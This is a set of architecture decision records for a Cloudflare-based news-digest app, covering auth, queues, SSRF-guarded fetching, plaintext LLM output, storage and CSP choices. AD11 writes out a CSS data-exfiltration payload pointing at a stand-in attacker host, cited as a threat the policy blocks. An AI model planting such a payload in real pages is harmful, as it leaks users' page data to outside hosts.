# Architecture Decision Records

<!-- doc-allow-large: index + full ADR bodies colocated by design; individual ADRs cannot be split without breaking cross-references -->

Decisions made during implementation, with rationale.

**Audience:** Developers

Each ADR documents a non-obvious design choice and the trade-offs considered. Decisions cite related requirements via REQ-X-N format.

---

## Decision Index

| ID | Decision | Category | Date |
|----|----------|----------|------|
| AD1 | Custom federated OAuth/OIDC (GitHub, Google) + HMAC-SHA256 JWT, no third-party auth library | Security | 2026-04-22 |
| AD2 | Cloudflare Queues for digest generation under thundering herd | Architecture | 2026-04-22 |
| AD3 | Server-side article-body fetching with SSRF guard | Security | 2026-04-27 |
| AD4 | Plaintext-only LLM output; no markdown parser or HTML sanitizer | Security | 2026-04-22 |
| AD5 | KV for caches, D1 for consistent state | Storage | 2026-04-22 |
| AD6 | Polling instead of SSE or WebSockets for scrape-run progress | UI | 2026-04-22 |
| AD7 | D1 for chunk completion tracking, replacing KV read-modify-write (CF-002) | Storage | 2026-04-27 |
| AD8 | Cookie attributes are the security contract — kept inline in REQ-AUTH-002/003 | Security | 2026-05-03 |
| AD9 | Storage-shape names (D1 columns, KV keys) are the persistence contract — kept inline in REQ-DISC/AUTH/SET | Storage | 2026-05-03 |
| AD10 | Atomic conditional UPDATE as the once-per-run idempotency gate — no `acquireOnceLock` helper | Architecture | 2026-05-03 |
| AD11 | Keep `style-src 'unsafe-inline'`; runtime `.style.X` writes for FLIP + view-transitions are intentional | Security | 2026-05-04 |
| AD12 | Integration env: separate Cloudflare resources, manual trigger from develop, crons disabled | Operations | 2026-05-04 |
| AD13 | No non-essential cookies (analytics gate) | Privacy | 2026-05-04 |
| AD14 | History-page perf-comparability test permanently skipped | Testing | 2026-05-04 |
| AD15 | Test pool exercises worker.ts directly; production runs through Astro-merged entry | Architecture | 2026-05-04 |
| AD16 | Single-writer invariant for KV `sources:{tag}` enforced via centralized helper | Storage | 2026-05-04 |

---

### AD1: Custom federated OAuth/OIDC (GitHub, Google) + HMAC-SHA256 JWT

**Decision:** Implement sign-in from scratch (~250 lines of TypeScript) instead of adopting Better Auth, Auth.js, or Lucia.

**Context:** Sessions need to be stateless, revocable, and tied to an OAuth/OIDC authorization-code flow. The project has no password, no 2FA, no passkeys. The implementation supports multiple providers (GitHub, Google) via a shared provider registry — each provider adds one registry entry and a `fetchProfile` adapter, with no per-provider branching in the auth routes.

**Alternatives considered:**
- Better Auth + D1 adapter — pulls in an ORM-ish abstraction; version churn risk.
- Auth.js — heavier dependency footprint; GitHub provider module adds little value here.
- Lucia — deprecated at the time of decision; would have required migration anyway.

**Rationale:** The codeflare repo has a proven pattern at this exact shape. Writing ~250 lines avoids a dependency with ~50 transitive ones, eliminates ORM coupling, and simplifies deployment. Migration to Better Auth later is a bounded one-day project if scope expands.

**Related requirements:** [REQ-AUTH-001](../../sdd/authentication.md#req-auth-001-sign-in-with-a-federated-identity-provider), [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation)

---

### AD2: Cloudflare Queues for digest generation

**Decision:** Use Cloudflare Queues to buffer scheduled and manual digest jobs. Cron dispatches; consumer generates.

**Context:** Target scale is 100 users. Worst realistic case: all 100 schedule the same HH:MM and generate at once. Inline cron generation at concurrency 5 × 60 s per digest = 30 minutes, which exceeds the 15-minute cron wall-time.

**Alternatives considered:**
- Inline cron with concurrency cap 20 — fits wall time (7.5 min) but risks OOM (20 × 5 MB = 100 MB of 128 MB limit) and hits Workers AI per-account concurrency limits.
- `ctx.waitUntil` on refresh only — doesn't solve the scheduled-herd problem.
- Durable Object alarms per user — more precision than needed; adds DO complexity.

**Rationale:** Queues give natural per-message isolation (each job in its own isolate, no shared memory), default 10-wide concurrency with built-in backpressure, and 3-retry semantics. Cron stays a tiny dispatcher. This is the primitive Cloudflare built exactly for this shape of problem.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence). Original framing was for the per-user generation pipeline (REQ-GEN-001, REQ-GEN-002, both Deprecated 2026-04-23 in the global-feed rework); the queue mechanism survived the rework intact.

---

### AD3: Server-side article-body fetching with SSRF guard

**Status:** Accepted (2026-04-27, supersedes AD3-original)

**Decision:** When a feed snippet is too thin to ground a useful summary, the chunk consumer fetches the article body directly. Each fetch is SSRF-guarded, time-bounded (8 s), and size-capped (1.5 MB); a failed fetch falls back to the snippet, never blocking a summary.

**Context:** Feed snippets are often too short to summarise faithfully. An SSRF denylist plus strict timeout and size caps reduce server-side fetch risk to negligible. Richer prompt context measurably improved summary quality on short-snippet feeds.

**Alternatives considered:**
- Keep the no-fetch posture and accept thin summaries on short-snippet feeds.
- Use a residential-IP scraping service.

**Rationale:** An SSRF denylist, 8 s timeout, and 1.5 MB size cap bring the risk to negligible. Fan-out is bounded-concurrency at 20 workers. The quality improvement on short-snippet feeds justifies the added complexity.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence) AC 8

---

### AD3-original: No server-side article-body fetching

**Status:** Superseded by AD3 on 2026-04-27

**Decision (historical):** Prohibit all server-side article-body fetching. Summaries rely entirely on the feed-provided snippet.

**Context (historical):** Drafted 2026-04-22 to avoid SSRF risk and Cloudflare-range rate-limiting by publishers. Reversed during the global-feed rework when summary quality on short-snippet feeds proved unacceptable and the risk surface was demonstrated to be manageable with explicit denylist + timeout + size cap.

**Why preserved:** Documentation-discipline.md prescribes immutable original ADRs with a separate superseding ADR. This entry is the archived original; AD3 above is the current decision.

---

### AD4: Plaintext-only LLM output

**Decision:** The LLM prompt requires plaintext output (no markdown, no HTML); summaries are stored as JSON arrays of plaintext strings and rendered via `textContent`.

**Context:** LLMs can be prompt-injected via hostile article titles to produce markdown with `javascript:` links or `<script>` tags. A markdown parser + HTML sanitizer pipeline is a non-trivial surface to keep secure across dependency updates.

**Alternatives considered:**
- Store markdown, render client-side with `marked` + DOMPurify.
- Store markdown, render server-side with sanitize-html.

**Rationale:** Plaintext + `textContent` makes XSS impossible by construction. One less dependency, one less configuration surface, zero sanitizer updates to track. Detail paragraphs are stored as a `string[]` and rendered via `textContent`, so the same invariant holds regardless of how many paragraphs the LLM returns. The constraint survived the 2026-04-23 global-feed rework (which retired the per-user generation REQs REQ-GEN-002/006) and now applies via REQ-PIPE-002.

**Related requirements:** [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-processing-with-json-output-contract), [REQ-READ-002](../../sdd/reading.md#req-read-002-article-detail-view) (original decision applied to REQ-GEN-005, Deprecated 2026-04-23, Replaced By REQ-PIPE-002)

---

### AD5: KV for caches, D1 for consistent state

**Decision:** KV holds discovered sources, headlines, and source-health counters. D1 holds users, digests, articles, and pending_discoveries.

**Context:** KV is eventually consistent (~60 s) and globally edge-replicated; D1 is strongly consistent but single-region. Each has a shape it's optimal for.

**Alternatives considered:**
- Put everything in D1 for strong consistency everywhere.
- Put everything in KV for speed.

**Rationale:** Caches tolerate ~60 s lag and benefit from edge reads. Pending discovery work needs transactional semantics (`SELECT ... LIMIT 3` + `DELETE`) that KV's list/scan can't provide cleanly. Using each primitive for what it's designed for keeps both simpler.

**Related requirements:** [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-per-tag-feed-discovery), [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence) (original decision applied to REQ-GEN-003, Deprecated 2026-04-23, Replaced By REQ-PIPE-001)

---

### AD6: Polling for scrape-run progress, not SSE or WebSockets

**Decision:** While a scrape run is in progress, the client polls `GET /api/scrape-status` every 5 seconds to drive the "Update in progress" indicator and the Force Refresh progress display on `/settings`.

**Context:** Scrape runs take ~60 s end-to-end. Users mostly see finished articles on their next visit; real-time progress is a quality-of-life indicator for operators watching `/settings` after triggering a force-refresh. The per-user live-generation polling pattern (REQ-READ-004, deprecated 2026-04-23) is no longer applicable — the dashboard always renders from the article pool.

**Alternatives considered:**
- Server-Sent Events streaming phase updates — no clean transport between the Queue consumer and the SSE HTTP handler without adding Durable Objects.
- WebSockets via per-user DO — works for codeflare (terminals), overkill here.

**Rationale:** Polling `GET /api/scrape-status` (one D1 SELECT + one KV get) is negligible overhead at the operator-only volume this endpoint serves. No DO complexity, no WebSocket protocol, no phase-update machinery. The UX difference is imperceptible for a one-shot status flip.

**Related requirements:** [REQ-PIPE-006](../../sdd/generation.md#req-pipe-006-scrape_runs-aggregation-surfaces-stats-history-and-in-flight-progress)

---

### AD7: D1 for chunk completion tracking, replacing KV read-modify-write

**Decision:** Move the "last chunk done" gate from a KV decrement (`scrape_run:{id}:chunks_remaining`) to a D1 `INSERT OR IGNORE` + `SELECT COUNT(*)` pattern on a dedicated `scrape_chunk_completions` table, with a follow-up conditional `UPDATE scrape_runs SET finalize_enqueued = 1 WHERE finalize_enqueued = 0` to gate the finalize handoff.

**Context (CF-002):** The original KV implementation used a read-modify-write decrement: each chunk consumer read the counter, decremented it, and wrote it back. Under Cloudflare Queues' at-least-once delivery, this exposed two races:

1. **Decrement race:** two concurrent last-chunk consumers read the same value before either wrote. Both saw "zero remaining", both enqueued a finalize pass, and both stamped the run as `ready`.
2. **Send-gate race:** even if the count check held, both consumers could call `SCRAPE_FINALIZE.send` before either set the KV gate.

KV's eventual consistency made both races effectively undetectable via testing in non-adversarial conditions.

**Alternatives considered:**
- Durable Object for serialized counter updates — correct, but adds a DO dependency to a pipeline that runs without one today.
- KV with Compare-And-Swap (`getWithMetadata` + `put` with `expirationTtl` as a CAS surrogate) — fragile; KV has no native CAS and the surrogate is not atomic.

**Rationale:** AD5's own principle applies directly: completion counting needs transactional semantics. `INSERT OR IGNORE` into a table keyed by `(scrape_run_id, chunk_index)` is idempotent under redelivery and gives an exact count via `SELECT COUNT(*)` — no race. The finalize-enqueue gate is collapsed into a single atomic `UPDATE … WHERE finalize_enqueued = 0`; D1 returns `meta.changes` for exactly one consumer. The KV counter (`scrape_run:{id}:chunks_remaining`) is retained as a derived mirror for the `/api/scrape-status` progress display but is no longer authoritative. Implements [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-processing-with-json-output-contract) and [REQ-PIPE-008](../../sdd/generation.md#req-pipe-008-cross-chunk-semantic-dedup-pass) AC 1 and AC 9.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence), [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-processing-with-json-output-contract), [REQ-PIPE-008](../../sdd/generation.md#req-pipe-008-cross-chunk-semantic-dedup-pass)

---

### AD8: Cookie attributes are the security contract

**Status:** Accepted (2026-05-03)

**Overrides:** `mechanism-leakage:REQ-AUTH-002`, `mechanism-leakage:REQ-AUTH-003`

**Decision:** Keep the session-cookie attributes (`__Host-` prefix, `HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`) inline in REQ-AUTH-002 AC 1 and REQ-AUTH-003 AC 3. Treat them as part of the security contract, not implementation detail.

**Context:** `spec-discipline.md`'s mechanism-leakage rule lists cookie attributes as belonging in `documentation/security.md` and recommends rewriting AC bullets to user-observable consequences (e.g., "JavaScript on the page cannot read the session token"). A `/sdd clean` run on 2026-05-03 escalated this as a MEDIUM JUDGMENT against the two auth REQs.

**Alternatives considered:**
- Rewrite AC 1 to user-observable language and create `documentation/security.md` with the attribute table behind a backlink.
- Add to `sdd/.user-overrides.md` as an opaque skip entry (today's mechanism, but hides the decision from anyone reading the codebase — see [codeflare#266](https://github.com/nikolanovoselec/codeflare/issues/266)).

**Rationale:**
- The attributes are load-bearing identifiers — security reviewers grep `__Host-`, `HttpOnly`, `SameSite=Lax` directly to verify the contract holds in source, tests, and the rendered Set-Cookie header.
- Translating to user-observable language loses information: the AC then doesn't constrain whether `__Host-` vs `__Secure-` prefix is used, doesn't pin the SameSite policy, doesn't require Path scoping. A future contributor reading the AC would not know the contract still constrains these.
- Same precedent as the existing `email_enabled` exception in `sdd/.user-overrides.md` (column name IS the contract because it's the shared identifier across UI, DB, dispatcher).

**Consequences:**
- spec-reviewer skips these two REQs via the `Overrides:` header above.
- Future cookie-policy changes update both the affected REQ AC and this ADR (and the corresponding security tests) in lockstep.
- `documentation/security.md` is not required by this decision — when it is eventually written, it backlinks here, not the other way around.

**Related requirements:** [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation), [REQ-AUTH-003](../../sdd/authentication.md#req-auth-003-csrf-defense-for-state-changing-endpoints)

---

### AD9: Storage-shape names are the persistence contract

**Status:** Accepted (2026-05-03)

**Overrides:** `mechanism-leakage:REQ-DISC-001`, `mechanism-leakage:REQ-DISC-002`, `mechanism-leakage:REQ-AUTH-002`, `mechanism-leakage:REQ-SET-001`, `mechanism-leakage:REQ-SET-005`, `forbidden-content-column-name:REQ-MAIL-001`

**Decision:** Keep D1 column names (`session_version`, `hashtags_json`, `digest_hour`, `email_enabled`, `pending_discoveries`) and KV key shapes (`sources:{tag}`) inline in their respective REQs' acceptance criteria. Treat them as part of the persistence contract surface, not implementation detail. The same reasoning applies to `email_enabled` in REQ-MAIL-001 AC 9 and the domain header on `sdd/email.md` line 3 — the column name IS the contract noun shared between the settings UI toggle, the `users` column, and the dispatcher's SQL predicate, equivalent to the env-var-as-contract pattern allowed by `spec-discipline.md`.

**Context:** `spec-discipline.md`'s mechanism-leakage rule lists "database column names" and "internal storage shapes" as belonging in `documentation/architecture.md` schema sections. A `/sdd clean` run on 2026-05-03 escalated this as a MEDIUM JUDGMENT against five REQs across the Discovery, Authentication, and Settings domains.

**Alternatives considered:**
- Rewrite each AC to describe the user-visible behavior abstractly, with a doc-backlink to a schema section in `documentation/architecture.md`.
- Add per-REQ entries to `sdd/.user-overrides.md` as opaque skip rules (today's mechanism, see [codeflare#266](https://github.com/nikolanovoselec/codeflare/issues/266)).
- Split each REQ into a behavior REQ (in `sdd/`) and a schema doc (in `documentation/`) — substantial AC reshape risk.

**Rationale:**
- These names are the load-bearing identifiers shared across SQL, the Workers runtime, and any future migration tooling. They are how `INSERT OR IGNORE INTO pending_discoveries`, `SELECT session_version FROM users`, and `KV.get('sources:' + tag)` are written in source — and how reviewers grep to verify a behavior holds.
- Same precedent as the existing `email_enabled` exception in `sdd/.user-overrides.md` (the column name IS the contract noun shared across UI, DB, dispatcher).
- The mechanism-leakage rule was authored against frontend-heavy projects where storage names are usually behind ORM abstractions. This project is intentionally close-to-the-metal (raw SQL strings, no ORM, KV keys hand-built) — the storage names are *the* user-facing surface for anyone who runs migrations or writes new queries.

**Consequences:**
- spec-reviewer skips these five REQs via the `Overrides:` header above.
- Schema changes update both the affected REQ AC and this ADR (and the corresponding migration files) in lockstep.
- `documentation/architecture.md` references the storage shapes in §4.2 (libraries) and §4.5 (Worker, queue, and migrations); `documentation/configuration.md` documents the KV bindings and naming conventions. This ADR explains why those high-level references coexist with the inline persistence names in the REQs.

**Related requirements:** [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-per-tag-feed-discovery), [REQ-DISC-002](../../sdd/discovery.md#req-disc-002-discovery-progress-visibility), [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation), [REQ-SET-001](../../sdd/settings.md#req-set-001-unified-first-run-and-edit-flow), [REQ-SET-005](../../sdd/settings.md#req-set-005-email-notification-preference)

---

### AD10: Atomic conditional UPDATE as the once-per-run idempotency gate

**Status:** Accepted (2026-05-03)

**Decision:** Idempotency for once-per-scrape-run side effects (queue-finalize enqueue, finalize stats fold) is enforced by a single conditional `UPDATE` against a dedicated `scrape_runs` column with a `WHERE col = 0` clause. The caller inspects `meta.changes` to decide whether to proceed (`changes === 1` → won the race) or short-circuit (`changes === 0` → another isolate already won). No separate `acquireOnceLock(...)` helper is introduced.

**Context:** Two existing call sites use this shape today: (a) `scrape-chunk-consumer.ts` flips `finalize_enqueued` 0→1 to gate the `SCRAPE_FINALIZE.send` (REQ-PIPE-008 AC 3); (b) `scrape-finalize-consumer.ts` flips `finalize_recorded` 0→1 inside the same UPDATE that also folds tokens + cost into the run's totals (REQ-PIPE-008 AC 5/AC 7). Code-review on 2026-04-29 (CF-026) flagged the duplicated shape and proposed a generic `acquireOnceLock(db, table, id, column)` helper.

**Alternatives considered:**
- **`acquireOnceLock` helper:** generic boolean-returning wrapper. The chunk-consumer site fits cleanly, but the finalize-consumer site fuses the gate with the per-attempt stats fold inside one atomic statement — extracting a bare "did I win?" helper would force splitting that into a lock + a separate UPDATE, losing the atomicity that protects against a transient mid-statement error leaving the gate flipped without the stats recorded.
- **`scrape_run_locks` keyed table** (one row per `scrape_run_id` × `lock_name`): cleaner if the number of gates grows beyond two. Today's two-site count doesn't justify the migration + new repo layer; revisit when a third gate would land.

**Rationale:**
- The pattern is two lines of SQL plus a meta.changes check. Wrapping it in a function adds an indirection the reader must follow with no ergonomics win on the call sites that exist.
- The composite UPDATE in finalize-consumer is genuinely load-bearing for atomicity — refactoring to "lock then stats" would re-introduce the failure mode that the consolidated atomic UPDATE was specifically designed (in PR #166) to eliminate.
- Source-grep for `WHERE finalize_recorded = 0` and `WHERE finalize_enqueued = 0` is sufficient to find every gate site; the duplication is at the syntactic surface, not at the semantic level.

**Consequences:**
- Both gate sites stay inline. Each is documented in-place with the `meta.changes` semantics and a comment explaining why the WHERE clause carries the gate value.
- The third gate that would warrant the keyed-table refactor is treated as the trigger; this ADR is the artifact future readers find when they look for "why isn't there an `acquireOnceLock` helper?".
- New gate sites SHOULD copy the pattern verbatim and document the meta.changes semantics inline; if a fourth or fifth site lands without the trigger refactor, this ADR is the place to revisit.

**Related requirements:** [REQ-PIPE-008](../../sdd/generation.md#req-pipe-008-cross-chunk-semantic-dedup-pass)

---

### AD11: Keep `style-src 'unsafe-inline'`; runtime `.style.X` writes are intentional

**Decision:** Retain `'unsafe-inline'` in the CSP `style-src` directive (`src/middleware/security-headers.ts`). Do not migrate FLIP animations or view-transition-name assignments away from runtime `.style.X` mutations.

**Context:** Two architectural patterns in the codebase write to inline style attributes from JavaScript at runtime:

1. **FLIP chip animations** (`src/lib/tag-railing-flip.ts`) — when the user toggles a hashtag, every chip in the tag strip measures its old and new positions, then writes `chip.style.transform = translate(${dx}px, ${dy}px)` on the inverse step and `chip.style.transform = 'translate(0,0)'` on the play step. The values are computed per-frame from real layout measurements; they cannot be enumerated at build time.

2. **View-transition-name pre-flight** (`src/scripts/page-effects.ts`) — before an SPA navigation, the active card writes `link.style.setProperty('view-transition-name', card-${slug})` so the browser's View Transitions API can pair the source card with the destination article-detail header. The slug is per-article, not per-build.

CSP3 `style-src` enforces the same allowlist on **runtime** style-attribute writes as on inline `<style>` blocks. Removing `'unsafe-inline'` blocks both patterns.

**Alternatives considered:**

- **`'unsafe-hashes'` directive (CSP3)** — allows hash-source to validate inline event handlers and `.style.X` writes. Requires a hash for every possible value. The FLIP transforms have continuous values (`translate(${dx}px, ${dy}px)`); enumeration is impossible. Rejected.

- **CSS custom properties via `setProperty('--var', value)`** — write to `--flip-translate` against a static CSS rule `transform: var(--flip-translate)`. Browser behavior on whether `style-src` enforces against custom-property writes is **inconsistent across engines** (the values are stored as opaque token strings, not parsed CSS at write time). Could work, but relies on a gray-area interpretation; would need cross-browser verification. Rejected as fragile.

- **Web Animations API rewrite** — `chip.animate([...])` runs entirely in JS, never touches the style attribute, CSP-exempt. Would require ~3-5h refactor of `tag-railing-flip.ts` plus a parallel rewrite of view-transition-name to use class toggles with a single fixed name. Working, but the security gain does not justify the regression risk on user-visible animation code that is hard to validate without a browser.

- **Dynamic `<style nonce="...">` injection** — generate a per-request nonce, inject one `<style>` per FLIP frame, append/remove. Massive overhead per animation step; complicates the FLIP loop. Rejected.

- **Migrate CSP entirely to Astro 6 `security.csp`** — Astro 6 emits per-page CSP via `<meta>` tag with auto-generated hashes. Combined with the middleware's response-header CSP, browsers enforce the intersection — and the runtime `.style.X` writes still wouldn't have hashes. Same fundamental blocker. Also blocked separately by the still-pinned `astro@5.18.1` (see `package.json`'s pin commit).

**Rationale:** The actual security cost of `'unsafe-inline'` on `style-src`, given the rest of the policy, is small:

- An XSS attacker who can inject CSS but not JS cannot run code or hijack the session — those vectors are blocked by the strict `script-src 'self'` (no inline scripts allowed).
- The classic CSS exfiltration vector — `body { background: url(http://attacker.com/log?...) }` — requires an outbound network call, which is blocked by `connect-src 'self'` and the narrow `img-src 'self' data: gravatar`.
- Attribute-leak attacks (`::before { content: attr(...) }` + URL load) are likewise blocked by `connect-src`.
- `frame-ancestors 'none'` blocks UI redress / clickjacking via injected styles.

Strict `script-src 'self'` is doing 95% of the XSS-prevention work. The marginal security gain from removing `'unsafe-inline'` on `style-src` does not justify replacing two well-understood, currently-shipping animation patterns with reimplementations on top of less-tested APIs. Many production sites run this exact combination (strict `script-src` + `'unsafe-inline'` style-src) deliberately.

**Consequences:**

- The CSP comment block in `src/middleware/security-headers.ts` documents `'unsafe-inline'` as required, and points at this ADR for the full reasoning.
- A future contributor who proposes removing `'unsafe-inline'` from `style-src` MUST also propose a concrete alternative for the FLIP and view-transition-name mutation patterns. The "just drop it" path will reliably break production (this is the third time it has been attempted on this project — see `hotfix/csp-style-unsafe-inline` history).
- If Astro ever ships native CSP support that handles runtime style mutations (e.g., via per-element nonces resolved at runtime), revisit this decision.
- `tests/e2e/csp-violation.spec.ts` continues to act as the merge gate for any CSP tightening — it subscribes to `securitypolicyviolation` events on a live `/digest` navigation and fails the build if any fire.

**Related requirements:** [REQ-OPS-003](../../sdd/observability.md#req-ops-003-security-headers-on-every-response), [CON-SEC-001](../../sdd/constraints.md#con-sec-001-strict-content-security-policy)

---

### AD12: Integration env: separate Cloudflare resources, manual trigger from develop, crons disabled

**Decision:** Stand up an integration deployment target on a distinct hostname (set per-fork via the `APP_URL` GitHub Environment variable on the `integration` environment) backed by fully isolated Cloudflare resources — D1, KV, queues all suffixed `-integration`. Deploys are manual-only via a dedicated GitHub Actions workflow (`.github/workflows/deploy-integration.yml`) that always pulls the current `develop` HEAD. Cron triggers are disabled on integration; the scrape pipeline runs only when the operator hits `/api/admin/force-refresh`. Worker secrets are sourced from repo-level GitHub Actions secrets via the `environment: integration` fallback.

**Context:** Major dependency bumps (Astro 5→6 was the trigger), schema migrations, CSP tightening, and animation rewrites had no live-edge proving ground before integration existed. The only path to a real-browser test was production, which meant either painful rollbacks (`hotfix/csp-style-unsafe-inline` history) or speculative testing on local dev that didn't catch view-transition / PWA / cron-driven regressions. Vibe-coding without a staging surface was costing rollback time.

**Alternatives considered:**

- **Branch-based auto-deploy** (push to `integration` branch → auto-deploy). Rejected: forces operator to maintain a parallel branch and remember to push it; rebase friction every time develop moves.
- **Same workflow with environment dropdown** (codeflare's pattern: one `deploy.yml`, manual dispatch picks production or integration). Cleaner but requires deeper restructuring (drop `[env.integration]` blocks in wrangler.toml in favour of `--name` CLI overrides + per-env `vars.X`). The two-workflow shape was the lower-risk path to ship integration today; the single-workflow refactor is a good cleanup later.
- **Auto-deploy on every push to develop** (mirror production's gate-on-PR-Checks pattern). Rejected: develop receives many small commits during iteration. Auto-deploys would consume time-to-deploy and the operator would lose the "deliberately staged a coherent change to test" workflow.
- **Shared resources (one D1, one KV) across prod and integration**. Rejected: integration migrations would corrupt prod data; integration force-refresh would compete with prod scrape state.
- **Cron triggers enabled on integration**. Rejected: would consume Workers AI budget on every-four-hour scrape runs that nobody is watching, and integration's empty seed data isn't representative enough to be worth the cost.

**Rationale:** The integration env serves a single purpose: confidence on changes that have non-trivial blast radius if they break in prod. The operator-only manual trigger matches the actual workflow (a person deciding "this is risky, I want to see it live before main"). Resource isolation removes the data-corruption class of failure. Crons-off keeps the cost surface narrow.

**Consequences:**

- 2× Cloudflare resource provisioning. Negligible cost on the small-data tier (D1, KV, queues are pennies/month).
- Operator must remember to manually trigger. There's no automation enforcing "test on integration before merging to main"; that discipline is on the human.
- Per-env GitHub Environment scoping is in place (`environment: integration`) so any secret can later be overridden without touching workflow code (e.g., a separate `OAUTH_JWT_SECRET` to isolate cross-env JWT identity confusion).
- Integration's `APP_URL` is sourced from a GitHub Environment **variable** (`vars.APP_URL` on the `integration` environment), NOT a secret and NOT hardcoded in `wrangler.toml`. The codeflare pattern: variables for non-sensitive per-environment config, secrets for credentials. Any fork sets their own integration hostname under Settings → Environments → integration → Variables → APP_URL without touching code.
- The bootstrap script (`scripts/bootstrap-resources.sh`) accepts an `ENV_NAME` env var to operate on env-scoped sections; placeholder IDs in wrangler.toml (`TBD-bootstrap-on-first-deploy`) trigger create-or-lookup-by-name on the first run.

**Related requirements:** [REQ-OPS-006](../../sdd/observability.md#req-ops-006-integration-deployment-target)

---

### AD13: No non-essential cookies (analytics gate)

**Status:** Accepted (2026-05-04)

**Decision:** The product MUST NOT set non-essential cookies. The only cookies allowed are session-essential ones (auth session token, refresh token, theme preference, OAuth state, CSRF). Adding any analytics, marketing, fingerprinting, A/B-testing, or tracking cookie requires revisiting this ADR and updating the tagline copy.

**Context:** The landing-page tagline at `src/pages/index.astro:54-57` asserts that this product runs without cookie banners ("Where we're going, we don't need cookie banners…"). This is a load-bearing user-trust claim that an unrelated future analytics/marketing PR could silently violate, breaking the tagline contract and potentially creating a compliance liability under EU/Swiss cookie-consent regimes.

**Rationale:** The tagline is not a marketing flourish — it's a stated contract. Reviewing the no-cookies claim during every analytics-curious PR keeps the contract honest. Cookieless analytics options exist (server-side aggregation from Worker request logs, edge-aggregated counters in KV, on-page Web-Vitals reporting via `sendBeacon` without an identifier cookie) and should be preferred when telemetry is genuinely needed.

**Consequences:**
- Reviewing this ADR is a mandatory step on any PR adding `Set-Cookie` for non-auth purposes.
- Telemetry/analytics integrations must use cookieless approaches (aggregated edge logs, one-shot beacon to a first-party endpoint with no client-side identifier, etc.) or this ADR must be superseded with an explicit decision and a tagline-copy revision.
- Until a dedicated `documentation/security.md` is bootstrapped, the essential cookie inventory lives inline in this ADR set (AD8 covers session + refresh-token cookies; OAuth state and theme cookies are documented at their respective issue sites). When `security.md` is eventually written it consolidates and supersedes those scattered entries.

**Related requirements:** none (this is a product-trust contract, not a behavioral REQ).

---

### AD14: History-page perf-comparability test permanently skipped

**Status:** Accepted (2026-05-04)

**Overrides:** `skipped-test:REQ-READ-002`, `skipped-test:REQ-HIST-001`

**Decision:** The numeric perf-comparability test (history back-nav ≤ 1.6× digest back-nav, median of 3 samples) in `tests/e2e/view-transition.spec.ts` is permanently skipped. No expiry, no removal trigger.

**Context:** A perf assertion was added to verify that `/history` back-navigation rendered within 1.6× the time of `/digest` back-navigation. The test reproducibly failed because `/history` is structurally heavier — opened day-groups carry more cards and trigger more layout work than the flat digest list. Multiple attempts to close the gap (lazy-render hidden groups, virtualize the list, defer non-visible card hydration) either regressed visual behavior or didn't move the timing meaningfully. User-confirmed on 2026-04-28: "we leave it as is, enough trying to fix this."

**Rationale:** The structural REQ-READ-002 / REQ-HIST-001 contracts (single-named-group view-transition shaping, return-morph pair forms at `astro:after-swap`) remain covered by the non-skipped tests above the skip in the same file. The numeric perf gap is a property of the feature, not a regression. Keeping a permanently-skipped test costs nothing, and resurrecting it would require a future refactor to claim the gap is closed — at which point the test exists as a guard against re-regression.

**Consequences:**
- spec-reviewer skips the `it.skip` finding for this specific test via the `Overrides:` header above.
- If a future refactor intentionally narrows the perf gap, restore the test and update or remove this ADR.
- The skip line in `tests/e2e/view-transition.spec.ts` references this ADR rather than `sdd/.user-overrides.md` (which is being phased out per codeflare#266).

**Related requirements:** [REQ-READ-002](../../sdd/reading.md#req-read-002-article-detail-view), [REQ-HIST-001](../../sdd/history.md#req-hist-001-day-grouped-article-history)

---

### AD15: Test pool exercises worker.ts directly; production runs through the Astro-merged entry

**Status:** Accepted (2026-05-04)

**Decision:** Vitest's Workers pool loads `src/worker.ts` directly as the test entry. Production loads `dist/_worker.js/_merged.mjs` (the Astro-built bundle) per the `main` field in `wrangler.toml`. The two entry shapes are intentionally NOT unified.

**Context:** Astro 5's `@astrojs/cloudflare` adapter wraps the Worker in its own SSR-aware fetch handler that composes Astro middleware (security headers, view-transition support, asset routing) before delegating to the user-defined cron/queue handlers in `worker.ts`. Vitest cannot load the merged Astro entry because (a) the bundle is produced by `astro build`, which the test pool doesn't run, and (b) the merged file uses Astro-internal module shapes incompatible with `cloudflare:test`. So tests target `worker.ts` directly and exercise the cron/queue surface plus any HTTP routes that `worker.ts` defines inline. Cross-cutting middleware (e.g., the security-headers middleware in `src/middleware/security-headers.ts`) lives in Astro's wrapper and is bypassed in unit tests by construction.

**Alternatives considered:**

- **Force `npm run build` in the test pool setup.** Rejected: doubles CI wall-time on every test run, and the merged module shape is still incompatible with the Workers pool runtime.
- **Hand-roll a Worker entry that composes the Astro middleware in code, used by both prod and tests.** Rejected: mirrors what `@astrojs/cloudflare` already does, churn on every Astro upgrade, no test wins because the middleware is exercised end-to-end via Playwright already.
- **Drop unit tests of cross-cutting middleware entirely.** Rejected: Playwright covers the integration path, but unit tests for individual middleware functions (origin check, rate limit, JWT verify) remain valuable and live in `tests/middleware/`.

**Rationale:** The production middleware chain is verified end-to-end by Playwright (`tests/e2e/csp-violation.spec.ts` and the new `tests/e2e/csp-policy.spec.ts` from D3 below). Unit tests cover middleware functions in isolation. The test/prod entry inversion is acceptable as long as the contract gate stays in Playwright, not in vitest.

**Consequences:**

- New cross-cutting middleware that needs to fire on every response MUST add a Playwright spec exercising it via real `fetch`. A vitest-only test against `worker.ts` will pass while the middleware is silently absent in production.
- The `src/worker.ts` `fetch` branch that exists for the test pool is dead code in production. Mark it with a comment so a future cleanup doesn't delete it on dead-code analysis grounds.
